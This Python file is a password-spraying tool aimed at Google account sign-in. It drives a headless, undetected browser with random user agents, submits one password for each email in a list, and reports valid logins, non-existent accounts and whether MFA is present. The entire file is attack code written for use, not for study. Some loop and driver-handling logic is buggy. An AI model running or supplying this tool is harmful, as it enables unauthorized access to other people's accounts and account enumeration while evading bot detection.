import time, argparse, datetime
from seleniumbase import Driver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from fake_useragent import UserAgent


def bad_response(driver):
    try:
        driver.find_element(By.XPATH, "//*[contains(text(), 'Wrong password. Try again or click Forgot password to reset it.')]")
        return True
    except:
        return False
    
def no_account(driver):
    try:
        driver.find_element(By.XPATH, "//*[contains(text(), 'Couldn’t find your Google Account')]")
        return True
    except:
        return False
	

def load_emails(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
         print(f"Error reading file: {e}")
         exit(1)

def password_options(driver, email, password):
    try:
        time.sleep(2)

        password_input = driver.find_element(By.NAME, "Passwd")
        
        password_input.send_keys(password)
        password_input.send_keys(Keys.ENTER)

        time.sleep(1)

        # Retrieve and print the title of the page
        if bad_response(driver) == True:
            print("[-] 400 FAILED! INVALID LOGIN {}: {}".format(email,password))
            time.sleep(1)
        elif no_account(driver) == True:
            print("[-] 404 FAILED! ACCOUNT DOES NOT EXIST {}: {}".format(email,password))
            time.sleep(1)

        else:
             try:
                driver.find_element(By.CLASS_NAME, "XY0ASe").text.split(", ")[1:]
                print(f"[+] SUCCESS! 200 VALID LOGIN {email}: {password}")
             except:
                driver.find_element(By.XPATH, "//*[contains(text(), '2-Step Verification')]")
                print(f"[+] SUCCESS! 200 VALID LOGIN {email}: {password} - Note: The response indicates MFA (Google) is in use.")

    except Exception as e:
        print("An error occurred:", e)

    finally:
        # Close the browser
        driver.quit()

def ps(driver, email, password):
    for emails in email:
        url = "http://accounts.google.com"
        driver.get(url)
        
        time.sleep(2)

        email_input = driver.find_element(By.ID, "identifierId")
        email_input.send_keys(emails)
        email_input.send_keys(Keys.ENTER)

        time.sleep(1)

        password_options(driver, emails,password)        

if __name__ == "__main__":

    parser = argparse.ArgumentParser("python3 gcp_v2.py --email email [--file file] --password 'Password' [--useragent <UserAgent String]" )
    parser.add_argument('--email', dest='email', help='Singular email you want to use', type=str)
    parser.add_argument('--file', help='File of emails, must be newline separated', type=str)
    parser.add_argument('--password', dest='password', help='Password to use for spraying', type=str)
    parser.add_argument('--useragent', dest='useragent', help='Custom Useragent to use to spray', type=str)
    args=parser.parse_args()

    if not args.email and not args.file:
        print("Please provide a username or a file containing usernames.")
        exit(1)
    
    usernames = [args.email] if args.email else load_emails(args.file)
    
    if args.useragent:
        # If a useragent is specified, start here
        useragent = args.useragent
        driver = Driver(uc=True, agent=useragent, headless=True, incognito=True)
    else:
        # Use a random user agent here
        useragent = UserAgent().random
        driver = Driver(uc=True, agent=useragent, headless=True, incognito=True)
    

    # Try start execution 

    try:
        # IF a file with a list of email addresses has been loaded, start here
        if args.file:
            print(f"Loading credentials from {args.file} with password {args.password}")
            start_time = datetime.datetime.now(datetime.UTC)
            print(f'Execution started at: {start_time}')
            # If the args useragent is used, print the currently used useragent
            print(f'Using User Agent: {useragent}')
        # If a singular email is being tested, start here
        elif args.email:
            print(f"Attacking {args.email} with password: {args.password}")
            start_time = datetime.datetime.now(datetime.UTC)
            print(f'Execution started at: {start_time}')
            print(f'Using User Agent: {useragent}')

        

        # for usernames in emails, start the program 
        for username in usernames:
            ps(driver, usernames, args.password)
    finally:
            driver.quit() 
